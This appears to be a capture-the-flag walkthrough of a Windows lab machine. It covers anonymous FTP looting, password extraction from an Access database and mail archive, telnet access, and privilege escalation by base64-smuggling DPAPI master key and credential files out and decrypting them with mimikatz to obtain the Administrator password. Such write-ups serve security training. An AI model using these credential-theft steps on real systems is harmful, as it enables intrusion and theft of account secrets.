
Running `nmap` I see there is an open port `21` running FTP.

I run:

```
$ ftp {victim ip}

Name: anonymous
Password: (blank)

ftp> ls
Backups
Engineer
ftp> cd Backups
ftp> type binary
ftp> get backup.mdb
ftp> cd ..
ftp> cd Engineer
ftp> get "Access Control.zip"
```

I return back to my local to access the files I got from `ftp`.

```
$ mdb-export backup.mdb auth_user
admin:admin
engineer:access4u@security
backup_admin:admin
```

I open the other file:

```
$ 7z x Access\ Control.zip

$ readpst -tea -m Access\ Control.pst
```

In the file I find the credentials `security:4Cc3ssC0ntr0ller`

I can telnet into the server:

```
# telnet {victim ip} 23
```

### PrivEsc

I’ll grab two binary files from windows host, the master key and credentials file.

First, I’ll find the master key:

```
C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>dir /a 
Volume in drive C has no label. 
Volume Serial Number is 9C45-DBF0 

Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001 

12/11/2018 04:47 PM <DIR> . 
12/11/2018 04:47 PM <DIR> .. 
08/22/2018 09:18 PM 468 0792c32e-48a5-4fe3-8b43-d93d64590580 
08/22/2018 09:18 PM 24 Preferred 2 File(s) 492 bytes 2 Dir(s) 16,764,465,152 bytes free
```

Use `certutil` to base64 encode it:

```
C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 output 
Input Length = 468 Output Length = 700 
CertUtil: -encode command completed successfully.

C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>type output 
-----BEGIN CERTIFICATE----- AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMA LQA4AGIANAAzAC0AZAA5ADMAZAA2ADQANQA5ADAANQA4ADAAAAAAAAAAAAAFAAAA sAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAAnFHKTQBwjHPU+/9g uV5UnvhDAAAOgAAAEGYAAOePsdmJxMzXoFKFwX+uHDGtEhD3raBRrjIDU232E+Y6 DkZHyp7VFAdjfYwcwq0WsjBqq1bX0nB7DHdCLn3jnri9/MpVBEtKf4U7bwszMyE7 Ww2Ax8ECH2xKwvX6N3KtvlCvf98HsODqlA1woSRdt9+Ef2FVMKk4lQEqOtnHqMOc wFktBtcUye6P40ztUGLEEgIAAABLtt2bW5ZW2Xt48RR5ZFf0+EMAAA6AAAAQZgAA D+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0CdnQ9DBEys1 /a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgbTN1Op8Rl3qp1 Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ 
-----END CERTIFICATE-----
```

Copy the file into `masterkey.b64` 

```
root@kali# cat masterkey.b64 | base64 -d > masterkey
```

Same process with the credentials file:

```
C:\Users\security\AppData\Roaming\Microsoft\Credentials>dir /a 
Volume in drive C has no label. 
Volume Serial Number is 9C45-DBF0 

Directory of C:\Users\security\AppData\Roaming\Microsoft\Credentials 

08/22/2018 09:18 PM <DIR> . 
08/22/2018 09:18 PM <DIR> .. 
08/22/2018 09:18 PM 538 51AB168BE4BDB3A603DADE4F8CA81290 
	1 File(s) 538 bytes 
	2 Dir(s) 16,764,465,152 bytes free 
	
C:\Users\security\AppData\Roaming\Microsoft\Credentials>certutil -encode 51AB168BE4BDB3A603DADE4F8CA81290 output 
Input Length = 538 
Output Length = 800 
CertUtil: -encode command completed successfully. 

C:\Users\security\AppData\Roaming\Microsoft\Credentials>type output 
-----BEGIN CERTIFICATE----- AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6VI40+LQ9k9 ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQA aQBhAGwAIABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/ MB8fEjrJTQejzAEgOBNfpaa8AAAAAA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m 5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7c1b5E0RycAsRf39nu WlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+ WHhvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZh xcVobtJWyGkQV/5v4qKxdlugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2h X5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHCKaRRuRHpRpuhfXEojcbDfuJs ZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/zBU7zW C+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJ vEgzQvv2cbicmQ== 
-----END CERTIFICATE----- 

C:\Users\security\AppData\Roaming\Microsoft\Credentials>del output
```

```
root@kali# cat credentials.b64 | base64 -d > credentials
```

- Fire up mimikatz

```
mimikatz # dpapi::masterkey /in:\users\0xdf\desktop\masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
...
[masterkey] with password: 4Cc3ssC0ntr0ller (normal user) key : b360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391 c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2 sha1: bf6d0654ef999c3ad5b09692944da3c0d0b68afe
```


I’ll use that master key to decrypt the credential file. `mimikatz` is smart enough to use the master key that is held in memory from previous instruction, but I can also explicitly pass it with

```
mimikatz # dpapi::cred /in:\users\0xdf\desktop\credentials

...

UserName : ACCESS\Administrator 
CredentialBlob : 55Acc3ssS3cur1ty@megacorp
```

I can sign into `telnet` with the credentials `Administrator:55Acc3ssS3cur1ty@megacorp`

